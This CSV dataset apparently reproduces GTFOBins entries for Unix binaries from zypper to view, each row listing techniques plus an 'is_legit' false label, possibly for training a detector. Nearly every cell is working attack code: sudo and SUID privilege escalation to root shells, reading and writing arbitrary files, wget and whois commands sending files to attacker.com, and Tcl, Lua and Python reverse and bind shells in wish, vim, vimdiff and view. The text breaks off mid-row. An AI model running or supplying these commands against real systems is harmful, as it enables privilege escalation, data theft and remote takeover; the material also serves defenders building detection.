"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"zypper","","This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.","[''zypper x ''-|-''TF=$(mktemp -d) cp /bin/sh $TF/zypper-x export PATH=$TF:$PATH zypper x '']","","This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.","[''sudo zypper x ''-|-''TF=$(mktemp -d) cp /bin/sh $TF/zypper-x sudo PATH=$TF:$PATH zypper x'']","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"zsoelim","","","","","","LFILE=file_to_read sudo zsoelim ""$LFILE""","The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.","","LFILE=file_to_read zsoelim ""$LFILE""","","LFILE=file_to_read ./zsoelim ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"zsh","","","zsh","","","sudo zsh","","","export LFILE=file_to_read zsh -c 'echo ""$(<$LFILE)""'","","./zsh","","export LFILE=file_to_write zsh -c 'echo DATA >$LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"zip","","","TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #' rm $TF","","","TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF","","","LFILE=file-to-read TF=$(mktemp -u) zip $TF $LFILE unzip -p $TF","","","","","","TF=$(mktemp -u) ./zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"zathura","","","zathura :! /bin/sh -c 'exec /bin/sh 0<&1'","","","sudo zathura :! /bin/sh -c 'exec /bin/sh 0<&1'","The interaction happens in a GUI window, while the shell is dropped in the terminal.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"yum","","","","","[''It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'id' > $TF/x.sh fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF ``` ''-|-''Spawn interactive root shell by loading a custom plugin. '']","[''sudo yum localinstall -y x-1.0-1.noarch.rpm ''-|-''TF=$(mktemp -d) cat >$TF/x<<EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF  cat >$TF/y.conf<<EOF [main] enabled=1 EOF  cat >$TF/y.py<<EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version='2.1' def init_hook(conduit):   os.execl('/bin/sh','/bin/sh') EOF  sudo yum -c $TF/x --enableplugin=y'']","","","","","","","","","","","Fetch a remote file via HTTP GET request. The file on the remote host must have an extension of `.rpm`, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp`, for example `/var/tmp/yum-root-cR0O4h/`.","RHOST=attacker.com RFILE=file_to_get.rpm yum install http://$RHOST/$RFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"yelp","","","","","","","","","LFILE=file_to_read yelp ""man:$LFILE""","","","","","","","","","","This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"yash","","","yash","","","sudo yash","","","","","./yash","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"yarn","","Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`.","[''yarn exec /bin/sh''-|-''TF=$(mktemp -d) echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json yarn --cwd $TF install '']","","","sudo yarn exec /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xz","","","","","","LFILE=file_to_read sudo xz -c ""$LFILE"" | xz -d","","","LFILE=file_to_read xz -c ""$LFILE"" | xz -d","","LFILE=file_to_read ./xz -c ""$LFILE"" | xz -d","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xxd","","","","","","LFILE=file_to_read sudo xxd ""$LFILE"" | xxd -r","","","LFILE=file_to_read xxd ""$LFILE"" | xxd -r","","LFILE=file_to_read ./xxd ""$LFILE"" | xxd -r","","LFILE=file_to_write echo DATA | xxd | xxd -r - ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xpad","","","","","","LFILE=file_to_read sudo xpad -f ""$LFILE""","This is a GUI application. The file content is displayed in a sticky note.","","LFILE=file_to_read xpad -f ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xmore","","","","","","LFILE=file_to_read sudo xmore $LFILE","The file is displayed in a Xorg window, so it needs a working graphical environment.","","LFILE=file_to_read xmore $LFILE","","LFILE=file_to_read ./xmore $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xmodmap","","","","","","LFILE=file_to_read sudo xmodmap -v $LFILE","The read file content is corrupted by error prints.","","LFILE=file_to_read xmodmap -v $LFILE","","LFILE=file_to_read ./xmodmap -v $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xetex","","","xetex --shell-escape '\write18{/bin/sh}\end'","","","sudo xetex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","./xetex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xelatex","","","xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","The read file will be part of the output.","[''sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi ''-|-''sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}' '']","","","xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi","","","","","","./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'","","","","The read file will be part of the output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xdotool","","","xdotool exec --sync /bin/sh","","","sudo xdotool exec --sync /bin/sh","This requires a running X server.","","","","./xdotool exec --sync /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xdg-user-dir","","","","","","","The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"xargs","","[''GNU version only.''-|-''Read interactively from `stdin`.'']","[''xargs -a /dev/null sh''-|-''echo x | xargs -Iy sh -c 'exec sh 0<&1'''-|-''xargs -Ix sh -c 'exec sh 0<&1' x^D^D '']","","GNU version only.","sudo xargs -a /dev/null sh","","","LFILE=file_to_read xargs -a ""$LFILE"" -0","","./xargs -a /dev/null sh -p","","","","","","","","This works as long as the file does not contain the NUL character, also a trailing `$'\n'` is added. The actual `/bin/echo` command is executed. GNU version only.","GNU version only.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"wish","","","wish exec /bin/sh <@stdin >@stdout 2>@stderr","","","sudo wish exec /bin/sh <@stdin >@stdout 2>@stderr","","","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish","","","","","","","","","","","","","","","","","","","","","","","","false"
"wireshark","","","","","This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.  After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:  1. select the only received packet;  2. right-click on ""Data"" from the ""Packet Details"" pane, and select ""Export Packet Bytes..."";  3. choose where to save the packet dump.","PORT=4444 sudo wireshark -c 1 -i lo -k -f ""udp port $PORT"" & echo 'DATA' | nc -u 127.127.127.127 ""$PORT""","","","","","","","","","","","","","","","","","","","This requires GUI interaction. Start Wireshark, then from the main menu, select ""Tools"" -> ""Lua"" -> ""Evaluate"". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.","wireshark","","","","","","","","","","","","","","","","","","","","","false"
"whois","","","","","","","`whois` hangs waiting for the remote peer to close the socket.","","","","","","","","","","[''Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file. The file has instances of `$'\x0d'` stripped.''-|-''Fetch remote binary file from a remote TCP port. Run `base64 ""file_to_send"" | nc -l -p 12345` on the attacker box to send the file.'']","[''RHOST=attacker.com RPORT=12345 LFILE=file_to_save whois -h $RHOST -p $RPORT > ""$LFILE"" ''-|-''RHOST=attacker.com RPORT=12345 LFILE=file_to_save whois -h $RHOST -p $RPORT | base64 -d > ""$LFILE""'']","","","","","","","","","","[''Send a text file to a TCP port. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. The file has a trailing `$'\x0d\x0a'` and its length is limited by the maximum size of arguments.''-|-''Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\x0d' | base64 -d > ""file_to_save""` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.'']","[''RHOST=attacker.com RPORT=12345 LFILE=file_to_send whois -h $RHOST -p $RPORT ""`cat $LFILE`"" ''-|-''RHOST=attacker.com RPORT=12345 LFILE=file_to_send whois -h $RHOST -p $RPORT ""`base64 $LFILE`"" '']","","","","","","","","","","","","","","","","","","false"
"whiptail","","","","","","LFILE=file_to_read sudo whiptail --textbox --scrolltext ""$LFILE"" 0 0","The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content.","","LFILE=file_to_read whiptail --textbox --scrolltext ""$LFILE"" 0 0","","LFILE=file_to_read ./whiptail --textbox --scrolltext ""$LFILE"" 0 0","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"wget","","","TF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF wget --use-askpass=$TF 0","","","TF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF sudo wget --use-askpass=$TF 0","","","LFILE=file_to_read wget -i $LFILE","","TF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF ./wget --use-askpass=$TF 0","","LFILE=file_to_write TF=$(mktemp) echo DATA > $TF wget -i $TF -o $LFILE","","","","Fetch a remote file via HTTP GET request.","URL=http://attacker.com/file_to_get LFILE=file_to_save wget $URL -O $LFILE","The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.","","","","","","","","","Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.","URL=http://attacker.com/ LFILE=file_to_send wget --post-file=$LFILE $URL","The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.","","","","","","","","","","","","","","","","","false"
"wc","","","","","","LFILE=file_to_read sudo wc --files0-from ""$LFILE""","The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message, so this may not be suitable to read binary files.","","LFILE=file_to_read wc --files0-from ""$LFILE""","","LFILE=file_to_read ./wc --files0-from ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"watch","","","watch -x sh -c 'reset; exec sh 1>&0 2>&0'","","","sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'","","","","","./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'","","","","./watch 'reset; exec sh 1>&0 2>&0'","","","","","This keeps the SUID privileges only if the `-x` option is present.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"wall","","","","","","LFILE=file_to_read sudo wall --nobanner ""$LFILE""","The textual file is dumped on the current TTY (neither to `stdout` nor to `stderr`).","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"w3m","","","","","","LFILE=file_to_read sudo w3m ""$LFILE"" -dump","","","LFILE=file_to_read w3m ""$LFILE"" -dump","","LFILE=file_to_read ./w3m ""$LFILE"" -dump","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"volatility","","","volatility -f file.dump volshell __import__('os').system('/bin/sh')","","","","This command requires some valid coredump file which, if not available, can be uploaded to the target. The `volshell` command spawns a [`python`](/gtfobins/python/) shell, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"virsh","","","","","","SCRIPT=script_to_run TF=$(mktemp) cat > $TF << EOF <domain type='kvm'>   <name>x</name>   <os>     <type arch='x86_64'>hvm</type>   </os>   <memory unit='KiB'>1</memory>   <devices>     <interface type='ethernet'>       <script path='$SCRIPT'/>     </interface>   </devices> </domain> EOF sudo virsh -c qemu:///system create $TF virsh -c qemu:///system destroy x","","","LFILE_DIR=/root LFILE_NAME=file_to_read  SPATH=file_to_save  virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH virsh -c qemu:///system pool-destroy x","","","","LFILE_DIR=/root LFILE_NAME=file_to_write  echo 'data' > data_to_write  TF=$(mktemp) cat > $TF <<EOF <volume type='file'>   <name>y</name>   <key>$LFILE_DIR/$LFILE_NAME</key>   <source>   </source>   <capacity unit='bytes'>5</capacity>   <allocation unit='bytes'>4096</allocation>   <physical unit='bytes'>5</physical>   <target>     <path>$LFILE_DIR/$LFILE_NAME</path>     <format type='raw'/>     <permissions>       <mode>0600</mode>       <owner>0</owner>       <group>0</group>     </permissions>   </target> </volume> EOF  virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR virsh -c qemu:///system vol-create --pool x --file $TF virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write virsh -c qemu:///system pool-destroy x","","","","","","This requires the user to be in the `libvirt` group to perform privileged file read.","","","","","","","","","","","This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.","","","","","","","","","","","","","","","","","false"
"vipw","","","","","","sudo vipw","This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.","","","","./vipw","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"vimdiff","","[''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `vimdiff` is compiled with Lua support.'']","[''vimdiff -c ':!/bin/sh'''-|-''vimdiff :set shell=/bin/sh :shell ''-|-''vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''vimdiff -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `vimdiff` is compiled with Lua support.'']","[''sudo vimdiff -c ':!/bin/sh'''-|-''sudo vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo vimdiff -c ':lua os.execute(""reset; exec sh"")''']","","","vimdiff file_to_read","","./vimdiff -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","vimdiff file_to_write iDATA ^[ w","","./vimdiff -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save vimdiff -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save vimdiff -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 vimdiff -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send vimdiff -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 vimdiff -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send vimdiff -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 vimdiff -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.","vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.","./vimdiff -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `vimdiff` is compiled with Lua support.","","","","false"
"vim","","[''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `vim` is compiled with Lua support.'']","[''vim -c ':!/bin/sh'''-|-''vim --cmd ':set shell=/bin/sh|:shell'''-|-''vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''vim -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `vim` is compiled with Lua support.'']","[''sudo vim -c ':!/bin/sh'''-|-''sudo vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo vim -c ':lua os.execute(""reset; exec sh"")''']","","","vim file_to_read","","./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","vim file_to_write iDATA ^[ w","","./vim -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save vim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save vim -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 vim -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send vim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 vim -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send vim -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 vim -c ':py import vim,sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 vim -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.","vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.","./vim -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `vim` is compiled with Lua support.","","","","false"
"vigr","","","","","","sudo vigr","This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.","","","","./vigr","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"view","","[''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `view` is compiled with Lua support.'']","[''view -c ':!/bin/sh'''-|-''view :set shell=/bin/sh :shell ''-|-''view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''view -c ':lua os.execute(""reset; exec sh"")''']","","[''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.''-|-''This requires that `view` is compiled with Lua support.'']","[''sudo view -c ':!/bin/sh'''-|-''sudo view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'''-|-''sudo view -c ':lua os.execute(""reset; exec sh"")''']","","","view file_to_read","","./view -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'","","view file_to_write iDATA ^[ w!","","./view -c ':lua os.execute(""reset; exec sh"")'","","[''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.''-|-''Fetch a remote file via TCP. Run `nc target.com 12345 < ""file_to_send""` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/file_to_get export LFILE=file_to_save view -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve(e[""URL""], e[""LFILE""]) vim.command("":q!"")' ''-|-''export LPORT=12345 export LFILE=file_to_save view -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   local d,x=c:receive(""*a"");   c:close();   local f=io.open(os.getenv(""LFILE""), ""wb"");   f:write(d);   io.close(f);' '']","","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.","","Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.","export RHOST=attacker.com export RPORT=12345 view -c ':lua local s=require(""socket""); local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   while true do     local r,x=t:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));t:send(b);   end;   f:close();t:close();'","","","","","[''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.''-|-''Send a local file via TCP. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send view -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode())) vim.command("":q!"")' ''-|-''export LPORT=8888 view -c ':py import vim,sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever() vim.command("":q!"")' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send view -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')   local d=f:read(""*a"")   io.close(f);   local s=require(""socket"");   local t=assert(s.tcp());   t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));   t:send(d);   t:close();' '']","","","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 view -c ':py import vim,sys,socket,os,pty;s=socket.socket() 